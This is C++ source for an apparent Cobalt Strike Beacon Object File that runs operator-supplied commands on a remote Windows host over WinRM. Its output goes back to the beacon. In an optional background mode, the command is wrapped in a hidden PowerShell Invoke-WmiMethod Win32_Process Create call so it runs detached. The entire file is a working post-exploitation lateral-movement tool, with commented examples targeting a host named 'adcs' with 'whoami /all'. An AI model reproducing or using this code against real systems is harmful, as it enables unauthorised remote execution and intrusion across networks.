#include <windows.h>
#define WSMAN_API_VERSION_1_0
#include <wsman.h>

extern "C" {
#include "beacon.h"

WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI INT    WINAPI MSVCRT$vsnprintf(PCHAR d, size_t n, PCHAR format, va_list arg);
WINBASEAPI size_t WINAPI MSVCRT$wcslen(const wchar_t* _Str);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManInitialize(DWORD flags, WSMAN_API_HANDLE *apiHandle);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManCreateSession(WSMAN_API_HANDLE apiHandle, PCWSTR connection, DWORD flags, WSMAN_AUTHENTICATION_CREDENTIALS* serverAuthenticationCredentials, WSMAN_PROXY_INFO* proxyInfo, WSMAN_SESSION_HANDLE* session);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
WINBASEAPI VOID   WINAPI WsmSvc$WSManCreateShell(WSMAN_SESSION_HANDLE session, DWORD flags, PCWSTR resourceUri, WSMAN_SHELL_STARTUP_INFO* startupInfo, WSMAN_OPTION_SET* options, WSMAN_DATA* createXml, WSMAN_SHELL_ASYNC* async, WSMAN_SHELL_HANDLE* shell);
WINBASEAPI DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD  dwMilliseconds);
WINBASEAPI BOOL   WINAPI KERNEL32$SetEvent(HANDLE hEvent);
WINBASEAPI VOID   WINAPI WsmSvc$WSManRunShellCommand(WSMAN_SHELL_HANDLE shell, DWORD flags, PCWSTR commandLine, WSMAN_COMMAND_ARG_SET* args, WSMAN_OPTION_SET* options, WSMAN_SHELL_ASYNC* async, WSMAN_COMMAND_HANDLE* command);
WINBASEAPI PVOID  WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI BOOL   WINAPI KERNEL32$CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
WINBASEAPI BOOL   WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL   WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI PWCHAR WINAPI MSVCRT$wcscmp(const wchar_t* _lhs, const wchar_t* _rhs);
WINBASEAPI VOID   WINAPI WsmSvc$WSManReceiveShellOutput(WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command, DWORD flags, WSMAN_STREAM_ID_SET* desiredStreamSet, WSMAN_SHELL_ASYNC* async, WSMAN_OPERATION_HANDLE* receiveOperation);
WINBASEAPI VOID   WINAPI WsmSvc$WSManCloseCommand(WSMAN_COMMAND_HANDLE commandHandle, DWORD flags, WSMAN_SHELL_ASYNC* async);
WINBASEAPI VOID   WINAPI WsmSvc$WSManCloseShell(WSMAN_SHELL_HANDLE shellHandle, DWORD flags, WSMAN_SHELL_ASYNC* async);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManCloseSession(WSMAN_SESSION_HANDLE session, DWORD flags);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManDeinitialize(WSMAN_API_HANDLE apiHandle, DWORD flags);
WINBASEAPI DWORD  WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManCloseOperation(WSMAN_OPERATION_HANDLE operationHandle, DWORD flags);

#define GetLastError KERNEL32$GetLastError
#define vsnprintf MSVCRT$vsnprintf
#define wcslen MSVCRT$wcslen
#define WSManInitialize WsmSvc$WSManInitialize
#define WSManCreateSession WsmSvc$WSManCreateSession
#define CreateEventW KERNEL32$CreateEventW
#define WSManCreateShell WsmSvc$WSManCreateShell
#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define SetEvent KERNEL32$SetEvent
#define WSManRunShellCommand WsmSvc$WSManRunShellCommand
#define HeapAlloc KERNEL32$HeapAlloc
#define GetProcessHeap KERNEL32$GetProcessHeap
#define CreatePipe KERNEL32$CreatePipe
#define WriteFile KERNEL32$WriteFile
#define ReadFile KERNEL32$ReadFile
#define wcscmp MSVCRT$wcscmp
#define WSManReceiveShellOutput WsmSvc$WSManReceiveShellOutput
#define WSManCloseCommand WsmSvc$WSManCloseCommand
#define WSManCloseShell WsmSvc$WSManCloseShell
#define WSManCloseSession WsmSvc$WSManCloseSession
#define WSManDeinitialize WsmSvc$WSManDeinitialize
#define CloseHandle KERNEL32$CloseHandle
#define HeapFree KERNEL32$HeapFree
#define WSManCloseOperation WsmSvc$WSManCloseOperation

    typedef struct  {
        HANDLE event;
        BOOL hadError;
        BOOL commandDone;
    } ctxCallback, *PCtxCallback;

    void WSManShellCompletionFunction( PVOID operationContext, DWORD flags, WSMAN_ERROR* error, WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command, WSMAN_OPERATION_HANDLE operationHandle, WSMAN_RECEIVE_DATA_RESULT* data )
    {
        if (operationContext == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "no context was passed to WSManShellCompletionFunction\n");
            return;
        }
        PCtxCallback ctxOperation = (PCtxCallback)operationContext;
        if (error && error->code) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManCreateShell: %d\n", error->code);
            ctxOperation->hadError = TRUE;
        }
        SetEvent(ctxOperation->event);
    }

    void ReceiveCallback( PVOID operationContext, DWORD flags, WSMAN_ERROR* error, WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command, WSMAN_OPERATION_HANDLE operationHandle, WSMAN_RECEIVE_DATA_RESULT* data )
    {
        if (operationContext == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "no context was passed to WSManRunShellCommand");
            return;
        }
        PCtxCallback ctxOperation = (PCtxCallback)operationContext;
        if (error && 0 != error->code) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManRunShellCommand: %d\n", error->code);
            ctxOperation->hadError = TRUE;
        }

        if (data && data->streamData.type & WSMAN_DATA_TYPE_BINARY && data->streamData.binaryData.dataLength) {
            DWORD bufferLength = data->streamData.binaryData.dataLength;
            PCHAR buffer = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength + 1);
            if (buffer == NULL) {
                BeaconPrintf(CALLBACK_ERROR, "error HeapAlloc: %d\n", GetLastError());
                return;
            }

            for (DWORD i = 0; i < bufferLength; i++)
                buffer[i] = ((PCHAR)data->streamData.binaryData.data)[i];
            buffer[bufferLength] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);

            if (!HeapFree(GetProcessHeap(), NULL, buffer))
                BeaconPrintf(CALLBACK_ERROR, "error HeapFree: %d\n", GetLastError());
        }

        if (data && data->commandState && wcscmp(data->commandState, WSMAN_COMMAND_STATE_DONE) == 0)
            ctxOperation->commandDone = TRUE;

        if ((error && 0 != error->code) || ctxOperation->commandDone)
            SetEvent(ctxOperation->event);
    }

    static PWCHAR BuildDetachedCommand(PWCHAR cmd)
    {
        const wchar_t prefix[] = L"powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command \"$r=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '";
        const wchar_t suffix[] = L"'; if ($r -ne $null) { Write-Output ('WMI ReturnValue: ' + $r.ReturnValue + ' PID: ' + $r.ProcessId) } else { Write-Output 'WMI: no result' }\"";
        size_t prefixLen = wcslen(prefix);
        size_t suffixLen = wcslen(suffix);
        size_t cmdLen = wcslen(cmd);
        size_t escapedCmdLen = 0;

        for (size_t i = 0; i < cmdLen; i++)
            escapedCmdLen += (cmd[i] == L'\'') ? 2 : 1;

        size_t totalLen = prefixLen + escapedCmdLen + suffixLen;
        PWCHAR buffer = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (totalLen + 1) * sizeof(wchar_t));
        if (buffer == NULL)
            return NULL;

        size_t offset = 0;
        for (size_t i = 0; i < prefixLen; i++)
            buffer[offset++] = prefix[i];
        for (size_t i = 0; i < cmdLen; i++) {
            if (cmd[i] == L'\'') {
                buffer[offset++] = L'\'';
                buffer[offset++] = L'\'';
            }
            else {
                buffer[offset++] = cmd[i];
            }
        }
        for (size_t i = 0; i < suffixLen; i++)
            buffer[offset++] = suffix[i];
        buffer[offset] = L'\0';
        return buffer;
    }

    void go(char* args, int length) {
        datap parser;
        BeaconDataParse(&parser, args, length);
        PWCHAR hostname = (PWCHAR)BeaconDataExtract(&parser, NULL);
        PWCHAR cmd      = (PWCHAR)BeaconDataExtract(&parser, NULL);
//        PWCHAR hostname = L"adcs";
//        PWCHAR cmd = L"whoami /all";

        HANDLE hEventShellCompl = { 0 };
        HANDLE hEventReceive = { 0 };
        WSMAN_API_HANDLE hApi = { 0 };
        WSMAN_SHELL_HANDLE hShell = { 0 };
        WSMAN_SHELL_ASYNC wsAsync = { 0 };
        WSMAN_SHELL_ASYNC wsAsyncShell = { 0 };
        WSMAN_COMMAND_HANDLE hCmd = { 0 };
        ctxCallback ctxCreateShell = { 0 };
        ctxCallback ctxReceiveShell = { 0 };
        WSMAN_OPERATION_HANDLE receiveOperation = { 0 };
        PWCHAR detachedCmd = NULL;

        WSMAN_AUTHENTICATION_CREDENTIALS serverAuthenticationCredentials = { 0 };
        serverAuthenticationCredentials.authenticationMechanism = WSMAN_FLAG_DEFAULT_AUTHENTICATION;
        //        serverAuthenticationCredentials.userAccount.username = L"domain\\user";
        //        serverAuthenticationCredentials.userAccount.password = L"password";

        PCWSTR commandLine = cmd;
        PCWSTR connection  = hostname;
        WSMAN_SESSION_HANDLE hSession = { 0 };
        DWORD timeoutMs = 15000;
        DWORD receiveWaitMs = timeoutMs;
        DWORD waitResult = WAIT_OBJECT_0;
        BOOL background = FALSE;

        if (BeaconDataLength(&parser) >= (int)sizeof(int)) {
            timeoutMs = (DWORD)BeaconDataInt(&parser);
            receiveWaitMs = (timeoutMs == 0) ? INFINITE : timeoutMs;
        }
        if (BeaconDataLength(&parser) >= (int)sizeof(int))
            background = BeaconDataInt(&parser) ? TRUE : FALSE;
        if (background) {
            const DWORD kBackgroundWaitMs = 5000;
            if (timeoutMs == 0 || timeoutMs > kBackgroundWaitMs)
                receiveWaitMs = kBackgroundWaitMs;
        }

        DWORD ret = WSManInitialize(WSMAN_FLAG_REQUESTED_API_VERSION_1_0, &hApi);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "Error WSManInitialize: %d\n", ret);
            goto deInitialize;
        }

        ret = WSManCreateSession(hApi, connection, 0, &serverAuthenticationCredentials, NULL, &hSession);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManCreateSesdsion: %d\n", ret);
            goto closeSession;
        }

        hEventShellCompl = CreateEventW(NULL, FALSE, FALSE, NULL);
        if (hEventShellCompl == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "error CreateEventW: %d\n", GetLastError());
            goto closeSession;
        }

        ctxCreateShell.event = hEventShellCompl;
        ctxCreateShell.hadError = FALSE;
        wsAsync.operationContext = &ctxCreateShell;
        wsAsync.completionFunction = &WSManShellCompletionFunction;

        WSManCreateShell(hSession, 0, WSMAN_CMDSHELL_URI, NULL, NULL, NULL, &wsAsync, &hShell);
        WaitForSingleObject(hEventShellCompl, 15000);
        if (ctxCreateShell.hadError)
            goto closeShell;

        if (background) {
            detachedCmd = BuildDetachedCommand(cmd);
            if (detachedCmd == NULL) {
                BeaconPrintf(CALLBACK_ERROR, "error HeapAlloc: %d\n", GetLastError());
                goto closeShell;
            }
            commandLine = detachedCmd;
        }

        WSManRunShellCommand(hShell, 0, commandLine, NULL, NULL, &wsAsync, &hCmd);
        WaitForSingleObject(hEventShellCompl, 15000);
        if (ctxCreateShell.hadError)
            goto closeCommand;

        hEventReceive = CreateEventW(NULL, FALSE, NULL, NULL);
        if (hEventReceive == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "error CreateEventW: %d\n", GetLastError());
            goto closeCommand;
        }
        ctxReceiveShell.event = hEventReceive;
        ctxReceiveShell.commandDone = FALSE;
        wsAsyncShell.operationContext = &ctxReceiveShell;
        wsAsyncShell.completionFunction = &ReceiveCallback;

        WSManReceiveShellOutput(hShell, hCmd, 0, NULL, &wsAsyncShell, &receiveOperation);
        waitResult = WaitForSingleObject(hEventReceive, receiveWaitMs);
        if (waitResult == WAIT_TIMEOUT) {
            if (background) {
                BeaconPrintf(CALLBACK_ERROR, "WinRM receive timeout after %lu ms (WMI call may still be running). Use -t to adjust wait.\n", receiveWaitMs);
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "WinRM receive timeout after %lu ms (command may still be running). Use -t 0 to wait indefinitely or -b to detach.\n", receiveWaitMs);
            }
        }

        ret = WSManCloseOperation(receiveOperation, 0);
        if (ret != NO_ERROR) BeaconPrintf(CALLBACK_ERROR, "error WSManCloseOperation: %ld\n", ret);

        if (background) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] WinRM command launched in background (WMI)\n");
        }

    cleanupCommandLine:
        if (detachedCmd != NULL) {
            HeapFree(GetProcessHeap(), 0, detachedCmd);
            detachedCmd = NULL;
        }

    closeCommand:
        WSManCloseCommand(hCmd, 0, &wsAsync);
        WaitForSingleObject(hEventShellCompl, 15000);

    closeShell:
        WSManCloseShell(hShell, 0, &wsAsync);
        WaitForSingleObject(hEventShellCompl, 15000);

    closeSession:
        ret = WSManCloseSession(hSession, 0);
        if (ret != NO_ERROR) BeaconPrintf(CALLBACK_ERROR, "error WSManCloseSession: %ld\n", ret);

    deInitialize:
        ret = WSManDeinitialize(hApi, 0);
        if (ret != NO_ERROR) BeaconPrintf(CALLBACK_ERROR, "error WSManDeinitialize: %ld\n", ret);

        if (hEventReceive != NULL)
            CloseHandle(hEventReceive);
        if (hEventShellCompl != NULL)
            CloseHandle(hEventShellCompl);
    }
}
